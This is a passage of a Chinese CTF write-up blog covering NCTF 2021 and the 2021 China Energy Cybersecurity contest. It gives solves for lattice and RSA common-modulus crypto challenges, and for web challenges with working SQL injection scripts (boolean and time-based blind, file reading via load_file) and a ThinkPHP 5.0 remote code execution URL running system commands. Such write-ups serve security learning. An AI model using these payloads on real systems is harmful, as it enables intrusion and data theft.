class="number">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line">s=<span class="number">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line">p=<span class="number">2</span>*q+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">kmax=<span class="built_in">int</span>(sha256(<span class="built_in">hex</span>(h)[<span class="number">2</span>:].encode().<span class="built_in">hex</span>().encode()).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))</span><br><span class="line"></span><br><span class="line">f = (<span class="number">2</span>^<span class="number">256</span> * kmax + h_) * s  - (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * d_ * r - h</span><br><span class="line">roots = small_roots(f, [<span class="number">2</span>^<span class="number">256</span>, <span class="number">2</span>^<span class="number">256</span>],  d=<span class="number">4</span>, m=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    kmin = Integer(root[<span class="number">0</span>])</span><br><span class="line">    k = (<span class="number">2</span>^<span class="number">256</span> * kmax + kmin)</span><br><span class="line">    x_ = Integer(root[<span class="number">1</span>])</span><br><span class="line">    x_ = (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * x_</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, x_, p) == y:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] found: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] wrong: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_)</span><br><span class="line">flag = <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(<span class="built_in">int</span>(x_).to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>) ^^ h)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110</span></span><br></pre></td></tr></table></figure><p>加上外壳，flag：<code>nctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><blockquote><p>这还能注入吗</p><p>Hint 1: 另一半flag在数据库中</p></blockquote><p><code>www.zip</code> 中三个文件 <code>config.php</code>、<code>DB.php</code>、<code>login.php</code>。</p><p><code>login.php</code> 中主逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$query</span> = db::prepare(<span class="string">&quot;SELECT * FROM `users` where password=md5(%s)&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// (1)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$query</span> = db::prepare(<span class="variable">$query</span> . <span class="string">&quot; and name=%s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// (2)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; and name=&#x27;benjaminEngel&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; limit 1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = db::commit(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NCTF&#123;ez&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong name or password.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用 <code>db::prepare</code> 预处理sql语句。</p><p>跟进 <code>DB.php</code> 看 <code>prepare()</code> 函数的定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span>(<span class="params"><span class="variable">$query</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_null(<span class="variable">$query</span>))&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$query</span>, <span class="string">&#x27;%&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;%s not included in query!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get args</span></span><br><span class="line"><span class="variable">$args</span> = func_get_args();</span><br><span class="line">array_shift( <span class="variable">$args</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$args</span>[<span class="number">0</span>]) &amp;&amp; count(<span class="variable">$args</span>) == <span class="number">1</span> ) &#123; <span class="comment">// (3)</span></span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$args</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$count_format</span> = substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count_format</span> !== count(<span class="variable">$args</span>))&#123; <span class="comment">// (4)</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Wrong number of arguments!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// escape</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="built_in">static</span>::<span class="variable">$db</span>-&gt;real_escape_string(<span class="variable">$value</span>); <span class="comment">// (5)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare</span></span><br><span class="line"><span class="variable">$query</span> = str_replace(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$query</span>); <span class="comment">// (6)</span></span><br><span class="line"><span class="variable">$query</span> = vsprintf(<span class="variable">$query</span>, <span class="variable">$args</span>); <span class="comment">// (7)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(3)处 <code>prepare()</code> 函数接收的 <code>$args</code> 为数组，(4)处 判断接收参数数量和 <code>%s</code> 数量是否一致，(5)处转义特殊字符，(6)处给 <code>%s</code> 匹配的参数值加单引号，(7)处替换 <code>$query</code> 中对应的 <code>%s</code> 为参数值。</p><p>在(1)的password和(2)的name处都使用了格式化字符串 <code>%s</code>，可以在(1)处传入 <code>%s</code> 干扰匹配，并在(2)处传入数组匹配两处 <code>%s</code>：</p><p><code>password=%s</code>，<code>name[0]=) or 1=1 --</code>，<code>name[1]=x</code></p><p>sql语句由 <code>SELECT * FROM `users` where password=md5(%s) and name=%s limit 1</code></p><p>变为 <code>SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1</code>，实现注入。</p><p>POST传参读到前半部分flag：<code>NCTF&#123;3v3ryth1ng_</code>。</p><p>把 <code>or 1=1</code> 替换为布尔盲注if语句即可拿到后半部分flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:3080/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;%s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name[0]&#x27;</span>: <span class="string">f&quot;) or <span class="subst">&#123;payload&#125;</span> -- &quot;</span>,</span><br><span class="line">            <span class="string">&#x27;name[1]&#x27;</span>: <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url,params=data)</span></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;NCTF&#123;3v3ryth1ng_&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># not_fantast1c_:)&#125;</span></span><br></pre></td></tr></table></figure><p>合并，flag：<code>NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125;</code></p><p>​    </p><h3 id="摆就完事了"><a href="#摆就完事了" class="headerlink" title="摆就完事了"></a>摆就完事了</h3><blockquote><p>啊对对对 太对辣太对辣<br>If you get no idea about the problem,there is no harm in diffing the source code with the official one.</p></blockquote><p>观察url结构 <code>/public/index.php/index/index/index</code>，疑似ThinkPHP路径，随便改写报错知为ThinkPHP V5.0.16。</p><p>尝试未开启强制路由RCE漏洞，加后缀：</p><p><code>http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</code></p><p>出现phpinfo页，改成 <code>&lt;?php%20system(&quot;cat /flag&quot;);?&gt;</code> 拿到flag：<code>nctf&#123;m1saka_wanna_kaibai&#125;</code>。</p><p>​    </p><h3 id="摆就完事了2-0"><a href="#摆就完事了2-0" class="headerlink" title="摆就完事了2.0"></a>摆就完事了2.0</h3><blockquote><p>卷起来 不准摆！</p></blockquote><p>版本同上，改了逻辑，未开启强制路由RCE漏洞无效。</p><p><code>www.zip</code> 下载源码，发现控制器 <code>applicaion/index/controller/M1sakaM1yuu.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: m1saka<span class="doctag">@x</span>1ct34m</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span>: www.m1saka.love</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M1sakaM1yuu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$username</span> = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = implode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (waf(<span class="variable">$str</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>)&#123;</span><br><span class="line">db(<span class="string">&#x27;m1saka&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;啊对对对&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;说什么我就开摆&#x27;</span>;<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照ThinkPHP控制器语法，GET方式传入 <code>username</code> 参数值（本地部署，开启debug调试功能测试）：</p><p> <code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx</code> 正常回显 <code>啊对对对</code>。</p><p>后续控制 <code>username</code> 参数值，绕过waf，实现insert注入：</p><p><code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0)</code></p><p>替换为时间盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sleep(0.6),0)&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>得到flag：<code>nctf&#123;m1saka_wanna_marry_liyuu_&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Hello-せかい"><a href="#Hello-せかい" class="headerlink" title="Hello せかい"></a>Hello せかい</h3><blockquote><p>欢迎来到NCTF-逆向工程(Reverse Engineering)<br>这里可能有你需要的工具:<br>ida pro 7.6 :链接：<a href="https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg">https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg</a> 提取码：o49x</p></blockquote><p>IDA打开，查找字符串，发现flag：<code>NCTF&#123;We1come_2_Reverse_Engineering&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;比赛时间：2021.11.27 9:00-2021.11.28 21:00&lt;/li&gt;
&lt;li&gt;比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分&lt;/li&gt;
&lt;li&gt;注册队伍登陆后，请在Profile页面绑定队伍成员信息&lt;/li</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021年中国能源网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-10-15T11:39:32.000Z</published>
    <updated>2021-10-16T16:00:36.995Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安全防护的重要指示精神，落实《关键信息基础设施安全保护条例》的有关要求，全面提升我国能源行业网络安全水平，加强能源网络安全人才培养与技术交流，加快构建“清洁低碳、安全高效”的能源体系，中国能源研究会定于2021年9～11月举办2021年中国能源网络安全大赛暨中国能源网络与数据安全大会。</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e1=835967807536519622934604405063</span><br><span class="line">c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span><br><span class="line">n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br><span class="line">e2=885003184250422219085124964981</span><br><span class="line">c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span><br><span class="line">n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br></pre></td></tr></table></figure></blockquote><p>$n_1=n_2$，RSA共模攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span></span><br><span class="line">e1 = <span class="number">835967807536519622934604405063</span></span><br><span class="line">c1 = <span class="number">19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span></span><br><span class="line">e2 = <span class="number">885003184250422219085124964981</span></span><br><span class="line">c2 = <span class="number">4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span 